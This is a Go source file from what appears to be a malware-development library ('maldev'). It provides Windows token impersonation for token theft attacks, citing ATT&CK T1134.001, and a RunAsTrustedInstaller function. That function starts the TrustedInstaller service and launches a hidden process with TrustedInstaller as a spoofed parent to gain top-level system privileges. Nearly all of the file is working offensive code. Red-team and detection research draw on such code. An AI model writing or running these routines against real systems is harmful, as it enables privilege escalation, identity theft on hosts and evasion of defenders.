//go:build windows

// Package impersonate provides Windows thread impersonation utilities.
package impersonate

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"syscall"
	"unsafe"

	"golang.org/x/sync/errgroup"
	"golang.org/x/sys/windows"

	"github.com/oioio-space/maldev/win/api"
	"github.com/oioio-space/maldev/win/token"
)

var (
	procOpenSCManagerW       = api.Advapi32.NewProc("OpenSCManagerW")
	procOpenServiceW         = api.Advapi32.NewProc("OpenServiceW")
	procStartServiceW        = api.Advapi32.NewProc("StartServiceW")
	procQueryServiceStatusEx = api.Advapi32.NewProc("QueryServiceStatusEx")
	procCloseServiceHandle   = api.Advapi32.NewProc("CloseServiceHandle")
)

const (
	scManagerConnect    = 0x0001
	serviceQueryStatus  = 0x0004
	serviceStart        = 0x0010
	serviceRunning      = 0x00000004
	scStatusProcessInfo = 0
)

type serviceStatusProcess struct {
	ServiceType             uint32
	CurrentState            uint32
	ControlsAccepted        uint32
	Win32ExitCode           uint32
	ServiceSpecificExitCode uint32
	CheckPoint              uint32
	WaitHint                uint32
	ProcessID               uint32
	ServiceFlags            uint32
}

// LogonType represents the type of logon operation.
type LogonType uint32

const (
	LOGON32_LOGON_INTERACTIVE    LogonType = 2
	LOGON32_LOGON_NETWORK        LogonType = 3
	LOGON32_LOGON_BATCH          LogonType = 4
	LOGON32_LOGON_SERVICE        LogonType = 5
	LOGON32_LOGON_NEW_CREDENTIALS LogonType = 9
)

// LogonProvider specifies the logon provider.
type LogonProvider uint32

const (
	LOGON32_PROVIDER_DEFAULT LogonProvider = 0
)

// LogonUserW wraps the advapi32 LogonUserW function and returns the resulting
// Windows token.
func LogonUserW(username, domain, password string, logonType LogonType, logonProvider LogonProvider) (windows.Token, error) {
	u, _ := windows.UTF16PtrFromString(username)
	d, _ := windows.UTF16PtrFromString(domain)
	p, _ := windows.UTF16PtrFromString(password)

	var handle uintptr
	ret, _, e := api.ProcLogonUserW.Call(
		uintptr(unsafe.Pointer(u)),
		uintptr(unsafe.Pointer(d)),
		uintptr(unsafe.Pointer(p)),
		uintptr(logonType),
		uintptr(logonProvider),
		uintptr(unsafe.Pointer(&handle)),
	)
	if int(ret) == 0 {
		return windows.Token(windows.InvalidHandle), os.NewSyscallError("LogonUserW", e)
	}
	return windows.Token(handle), nil
}

// ImpersonateLoggedOnUser wraps the advapi32 ImpersonateLoggedOnUser function.
func ImpersonateLoggedOnUser(t windows.Token) error {
	ret, _, e := api.ProcImpersonateLoggedOnUser.Call(uintptr(t))
	if int(ret) == 0 {
		return os.NewSyscallError("ImpersonateLoggedOnUser", e)
	}
	return nil
}

// ThreadEffectiveTokenOwner returns the user and domain of the effective token
// on the current thread. Requires administrator privileges.
func ThreadEffectiveTokenOwner() (user string, domain string, err error) {
	t := windows.GetCurrentThreadEffectiveToken()
	tokenUser, err := t.GetTokenUser()
	if err != nil {
		return "", "", err
	}

	user, domain, _, err = tokenUser.User.Sid.LookupAccount("")
	if err != nil {
		return "", "", err
	}

	return user, domain, nil
}

// runImpersonated executes fn on a locked OS thread impersonated as the given
// Windows token. The thread reverts to self after fn returns.
func runImpersonated(t windows.Token, fn func() error) error {
	group := new(errgroup.Group)
	group.Go(func() error {
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()

		if err := ImpersonateLoggedOnUser(t); err != nil {
			return err
		}
		defer windows.RevertToSelf()

		return fn()
	})
	return group.Wait()
}

// ImpersonateToken runs callbackFunc on a locked OS thread under the identity
// of the given token (typically obtained via token.Steal or token.Interactive).
// The thread reverts to self after callbackFunc returns.
//
// Unlike ImpersonateThread which requires credentials, this accepts a stolen
// or duplicated token handle — useful for token theft attacks (T1134.001).
func ImpersonateToken(tok *token.Token, callbackFunc func() error) error {
	return runImpersonated(tok.Token(), callbackFunc)
}

// ImpersonateThread runs callbackFunc on a locked OS thread under the
// credentials of the provided user. The thread reverts to self after
// callbackFunc returns.
func ImpersonateThread(isInDomain bool, domain, username, password string, callbackFunc func() error) error {
	logonType := LOGON32_LOGON_INTERACTIVE
	if !isInDomain {
		domain = "."
	}

	t, err := LogonUserW(username, domain, password, logonType, LOGON32_PROVIDER_DEFAULT)
	if err != nil {
		return err
	}

	wt := token.New(t, token.Impersonation)
	defer wt.Close()

	if err = wt.EnableAllPrivileges(); err != nil {
		return err
	}

	return runImpersonated(wt.Token(), callbackFunc)
}

// RunAsTrustedInstaller spawns cmd with args as a child of the TrustedInstaller
// service process (NT SERVICE\TrustedInstaller), giving it TI-level privileges.
// Requires admin + SeDebugPrivilege.
//
// The returned *exec.Cmd has already been started. The caller is responsible
// for calling cmd.Wait().
func RunAsTrustedInstaller(cmd string, args ...string) (*exec.Cmd, error) {
	tiPID, err := startAndFindTI()
	if err != nil {
		return nil, err
	}

	parentHandle, err := windows.OpenProcess(windows.PROCESS_CREATE_PROCESS, false, tiPID)
	if err != nil {
		return nil, fmt.Errorf("open TrustedInstaller process: %w", err)
	}
	defer windows.CloseHandle(parentHandle)

	c := exec.Command(cmd, args...)
	c.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		ParentProcess: syscall.Handle(parentHandle),
	}

	if err := c.Start(); err != nil {
		return nil, fmt.Errorf("start command: %w", err)
	}
	return c, nil
}

// startAndFindTI ensures the TrustedInstaller service is running and returns its PID.
func startAndFindTI() (uint32, error) {
	scName, _ := windows.UTF16PtrFromString("TrustedInstaller")
	emptyStr, _ := windows.UTF16PtrFromString("")

	hSCM, _, err := procOpenSCManagerW.Call(
		uintptr(unsafe.Pointer(emptyStr)),
		0,
		uintptr(scManagerConnect),
	)
	if hSCM == 0 {
		return 0, fmt.Errorf("OpenSCManager: %w", err)
	}
	defer procCloseServiceHandle.Call(hSCM) //nolint:errcheck

	hSvc, _, err := procOpenServiceW.Call(
		hSCM,
		uintptr(unsafe.Pointer(scName)),
		uintptr(serviceQueryStatus|serviceStart),
	)
	if hSvc == 0 {
		return 0, fmt.Errorf("OpenService(TrustedInstaller): %w", err)
	}
	defer procCloseServiceHandle.Call(hSvc) //nolint:errcheck

	// Start the service — idempotent if already running.
	procStartServiceW.Call(hSvc, 0, 0) //nolint:errcheck

	var ssp serviceStatusProcess
	needed := uint32(unsafe.Sizeof(ssp))
	r, _, err := procQueryServiceStatusEx.Call(
		hSvc,
		uintptr(scStatusProcessInfo),
		uintptr(unsafe.Pointer(&ssp)),
		uintptr(needed),
		uintptr(unsafe.Pointer(&needed)),
	)
	if r == 0 {
		return 0, fmt.Errorf("QueryServiceStatusEx: %w", err)
	}
	if ssp.CurrentState != serviceRunning {
		return 0, fmt.Errorf("TrustedInstaller service not running (state=%d)", ssp.CurrentState)
	}
	return ssp.ProcessID, nil
}
